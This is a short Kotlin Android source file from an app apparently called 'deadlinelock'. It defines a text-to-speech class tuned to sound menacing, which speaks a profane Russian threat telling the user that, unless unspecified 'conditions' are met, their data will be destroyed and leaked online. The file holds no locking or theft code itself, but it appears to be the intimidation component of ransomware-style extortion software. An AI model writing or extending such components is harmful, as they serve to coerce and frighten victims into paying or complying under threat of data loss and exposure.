package com.rocket.deadlinelock

import android.content.Context
import android.speech.tts.TextToSpeech
import java.util.Locale

class ScaryVoice(private val context: Context) : TextToSpeech.OnInitListener {
    private var tts: TextToSpeech? = null
    private var isReady = false

    init {
        tts = TextToSpeech(context, this)
    }

    override fun onInit(status: Int) {
        if (status == TextToSpeech.SUCCESS) {
            val result = tts?.setLanguage(Locale.getDefault())
            if (result != TextToSpeech.LANG_MISSING_DATA && result != TextToSpeech.LANG_NOT_SUPPORTED) {
                isReady = true
                // Настраиваем голос: чуть ниже и медленнее для зловещего эффекта
                tts?.setPitch(0.8f)
                tts?.setSpeechRate(0.9f)
            }
        }
    }

    fun speak() {
        if (isReady) {
            val text = "Ты доигрался. Если ты не выполнишь условия, то твоим данным будет пиздец, а также они уйдут в сеть."
            tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "scary_voice_id")
        }
    }

    fun stop() {
        tts?.stop()
        tts?.shutdown()
    }
}
